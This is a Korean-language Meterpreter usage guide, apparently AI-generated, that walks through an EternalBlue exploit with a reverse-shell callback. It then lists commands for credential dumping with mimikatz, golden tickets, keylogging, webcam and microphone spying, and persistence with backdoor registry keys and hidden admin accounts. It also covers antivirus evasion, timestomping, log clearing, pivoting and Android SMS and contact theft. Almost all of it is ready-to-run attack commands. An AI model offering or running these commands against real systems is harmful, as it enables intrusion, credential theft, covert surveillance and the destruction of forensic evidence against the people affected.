# Meterpreter 사용법 완전 가이드

## Meterpreter 개요

Meterpreter는 Metasploit의 고급 페이로드로, 메모리에서 실행되어 흔적을 최소화하면서 강력한 기능을 제공합니다.

## Meterpreter 세션 획득

### 기본 설정 및 실행

```bash
# 익스플로잇 선택 후 Meterpreter 페이로드 설정
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

# 성공 시 Meterpreter 세션 시작
meterpreter >
```

## 기본 명령어

### 도움말 및 정보

```bash
# 도움말 보기
meterpreter > help

# 핵심 명령어만 보기
meterpreter > help core

# 시스템 정보 확인
meterpreter > sysinfo

# 현재 사용자 확인
meterpreter > getuid

# 프로세스 ID 확인
meterpreter > getpid
```

### 세션 제어

```bash
# 세션 배경화 (MSF 콘솔로 복귀)
meterpreter > background

# 세션 종료
meterpreter > exit

# 세션 마이그레이션 (다른 프로세스로 이동)
meterpreter > migrate 1234

# 세션 업그레이드 (권한 상승 후)
meterpreter > getsystem
```

## 파일 시스템 조작

### 기본 파일 작업

```bash
# 현재 디렉토리 확인
meterpreter > pwd

# 디렉토리 변경
meterpreter > cd C:\\Users\\Administrator

# 파일 목록 보기
meterpreter > ls
meterpreter > dir

# 파일 상세 정보
meterpreter > ls -la

# 파일 다운로드
meterpreter > download C:\\Users\\Administrator\\Desktop\\important.txt /tmp/

# 파일 업로드
meterpreter > upload /tmp/payload.exe C:\\temp\\

# 파일 검색
meterpreter > search -f *.txt -d C:\\Users\\
```

### 고급 파일 작업

```bash
# 파일 내용 보기
meterpreter > cat C:\\Users\\Administrator\\Desktop\\passwords.txt

# 파일 편집
meterpreter > edit C:\\temp\\config.txt

# 파일 삭제
meterpreter > rm C:\\temp\\malware.exe

# 디렉토리 생성
meterpreter > mkdir C:\\temp\\tools

# 디렉토리 삭제
meterpreter > rmdir C:\\temp\\old_folder

# 파일 타임스탬프 변경
meterpreter > timestomp C:\\temp\\backdoor.exe -f C:\\Windows\\System32\\notepad.exe
```

## 프로세스 관리

### 프로세스 조회 및 조작

```bash
# 실행 중인 프로세스 목록
meterpreter > ps

# 특정 프로세스 검색
meterpreter > ps | grep explorer.exe

# 프로세스 종료
meterpreter > kill 1234

# 새 프로세스 실행
meterpreter > execute -f cmd.exe -i -H

# 숨겨진 프로세스로 실행
meterpreter > execute -f calc.exe -H

# 프로세스 마이그레이션
meterpreter > migrate 1234
```

### 권한 및 보안

```bash
# 시스템 권한 획득 시도
meterpreter > getsystem

# 현재 권한 확인
meterpreter > getprivs

# 토큰 가져오기
meterpreter > steal_token 1234

# UAC 우회
meterpreter > bypass_uac
```

## 네트워크 및 연결

### 네트워크 정보 수집

```bash
# 네트워크 인터페이스 정보
meterpreter > ifconfig
meterpreter > ipconfig

# 라우팅 테이블
meterpreter > route

# ARP 테이블
meterpreter > arp

# 네트워크 연결 상태
meterpreter > netstat

# DNS 설정 확인
meterpreter > resolve www.example.com
```

### 포트포워딩 및 터널링

```bash
# 로컬 포트포워딩
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100

# 포트포워딩 목록
meterpreter > portfwd list

# 포트포워딩 삭제
meterpreter > portfwd delete -l 8080

# 역방향 터널링
meterpreter > portfwd add -R -l 4444 -p 4444 -r 127.0.0.1
```

## 정보 수집 (Post-Exploitation)

### 시스템 정보 수집

```bash
# 환경 변수
meterpreter > getenv

# 설치된 프로그램 목록
meterpreter > run post/windows/gather/enum_applications

# 사용자 계정 정보
meterpreter > run post/windows/gather/enum_logged_on_users

# 네트워크 정보 상세 수집
meterpreter > run post/windows/gather/enum_shares

# 레지스트리 정보
meterpreter > run post/windows/gather/enum_services
```

### 크리덴셜 덤핑

```bash
# SAM 해시 덤프
meterpreter > hashdump

# LSASS에서 크리덴셜 추출
meterpreter > load kiwi
meterpreter > creds_all

# 특정 사용자 패스워드
meterpreter > creds_msv

# Kerberos 티켓
meterpreter > kerberos
```

## 확장 모듈 (Extensions)

### Kiwi (Mimikatz) 확장

```bash
# Kiwi 로드
meterpreter > load kiwi

# 모든 크리덴셜 덤프
meterpreter > creds_all

# 특정 타입 크리덴셜
meterpreter > creds_msv
meterpreter > creds_kerberos
meterpreter > creds_ssp
meterpreter > creds_tspkg

# Golden Ticket 생성
meterpreter > golden_ticket_create -d domain.com -u administrator -s S-1-5-21-... -k aes256_key
```

### 스크린 캡처 및 감시

```bash
# 스크린샷 촬영
meterpreter > screenshot

# 연속 스크린샷 (10초마다)
meterpreter > run post/windows/gather/screen_spy TIME=10

# 웹캠 목록
meterpreter > webcam_list

# 웹캠 스냅샷
meterpreter > webcam_snap

# 웹캠 스트림
meterpreter > webcam_stream
```

### 키로깅

```bash
# 키로거 시작
meterpreter > keyscan_start

# 키로그 덤프
meterpreter > keyscan_dump

# 키로거 중지
meterpreter > keyscan_stop
```

## 지속성 (Persistence)

### 기본 지속성 메커니즘

```bash
# 서비스로 지속성 설정
meterpreter > run persistence -S -U -X -i 5 -p 4444 -r 192.168.1.50

# 레지스트리 기반 지속성
meterpreter > run persistence -A -L c:\\temp\\ -P windows/meterpreter/reverse_tcp -p 4444 -r 192.168.1.50

# 스케줄러 작업으로 지속성
meterpreter > run scheduleme -c "C:\\temp\\backdoor.exe" -tn "WindowsUpdate"
```

### 고급 지속성 기법

```bash
# WMI 이벤트 구독
meterpreter > run post/windows/manage/wmi_persistence

# Sticky Keys 백도어
meterpreter > run post/windows/manage/sticky_keys

# 새 관리자 계정 생성
meterpreter > run post/windows/manage/enable_rdp USERNAME=hacker PASSWORD=P@ssw0rd
```

## 안티바이러스 회피

### 프로세스 숨기기

```bash
# 프로세스 목록에서 숨기기
meterpreter > migrate 1234  # explorer.exe 같은 정상 프로세스로 이동

# 메모리 내 실행
meterpreter > execute -f payload.exe -m
```

### 파일 숨기기

```bash
# 파일 속성 숨김 설정
meterpreter > run post/windows/manage/priv_migrate

# ADS(Alternate Data Streams) 사용
meterpreter > upload payload.exe C:\\Windows\\System32\\calc.exe:hidden.exe
```

## 레지스트리 조작

### 기본 레지스트리 작업

```bash
# 레지스트리 키 열기
meterpreter > reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

# 레지스트리 값 읽기
meterpreter > reg queryval -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v "Windows Defender"

# 레지스트리 값 설정
meterpreter > reg setval -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v "Backdoor" -t REG_SZ -d "C:\\temp\\backdoor.exe"

# 레지스트리 키 삭제
meterpreter > reg deleteval -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v "Backdoor"
```

## 이벤트 로그 조작

### 로그 지우기

```bash
# 시스템 이벤트 로그 지우기
meterpreter > clearev

# 특정 로그 지우기
meterpreter > run post/windows/manage/delete_logs
```

## 사용자 계정 관리

### 계정 생성 및 관리

```bash
# 새 사용자 생성
meterpreter > run post/windows/manage/add_user USERNAME=backdoor PASSWORD=P@ssw0rd

# 관리자 그룹 추가
meterpreter > run post/windows/manage/add_user_to_local_admin_group USERNAME=backdoor

# RDP 활성화
meterpreter > run post/windows/manage/enable_rdp
```

## 네트워크 정찰

### 내부 네트워크 스캔

```bash
# 라우트 추가 (피벗팅)
meterpreter > run autoroute -s 192.168.100.0/24

# 라우트 확인
meterpreter > run autoroute -p

# 내부 네트워크 포트 스캔
meterpreter > run post/multi/gather/ping_sweep RHOSTS=192.168.100.0/24
```

## 피벗팅 (Pivoting)

### 멀티홉 공격

```bash
# SOCKS 프록시 설정
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > run -j

# Meterpreter에서 라우트 추가
meterpreter > run autoroute -s 192.168.100.0/24

# ProxyChains로 다른 도구 사용
# /etc/proxychains.conf 수정 후
proxychains nmap -sT 192.168.100.1-254 -p 22,80,443
```

## 모바일 플랫폼 (Android)

### Android Meterpreter

```bash
# Android 세션에서 사용 가능한 명령어

# 기본 정보
meterpreter > sysinfo
meterpreter > getuid

# SMS 조작
meterpreter > dump_sms

# 통화 기록
meterpreter > dump_calllog

# 연락처 정보
meterpreter > dump_contacts

# 위치 정보
meterpreter > geolocate

# 사진/동영상 촬영
meterpreter > webcam_snap
meterpreter > record_mic

# 앱 목록
meterpreter > app_list
```

## 세션 복구 및 재연결

### 세션 복구

```bash
# 세션이 끊어진 경우 재연결
meterpreter > transport list
meterpreter > transport add -t reverse_tcp -l 192.168.1.50 -p 4445
meterpreter > transport set reverse_tcp://192.168.1.50:4445
```

## 성능 최적화 및 팁

### 메모리 사용량 최적화

```bash
# 불필요한 확장 언로드
meterpreter > use -l  # 로드된 확장 확인
meterpreter > use -u kiwi  # kiwi 확장 언로드

# 프로세스 마이그레이션으로 안정성 확보
meterpreter > ps | grep explorer
meterpreter > migrate <PID>
```

### 에러 처리

```bash
# 일반적인 에러 상황들

# "Operation failed: Access is denied" -> 권한 부족
meterpreter > getsystem

# "Operation failed: Invalid parameter" -> 잘못된 명령어 파라미터
meterpreter > help <command>

# 세션 불안정 -> 마이그레이션 필요
meterpreter > migrate <stable_process_pid>
```

## 보안 고려사항

### 탐지 회피

```bash
# 메모리 스캔 회피를 위한 마이그레이션
meterpreter > ps | grep svchost
meterpreter > migrate <svchost_pid>

# 네트워크 트래픽 암호화
meterpreter > use -l  # TLS 사용 여부 확인

# 타이밍 공격 방지
meterpreter > sleep 5  # 5초 대기 후 명령 실행
```

이제 페이로드 생성 가이드를 작성하겠습니다.
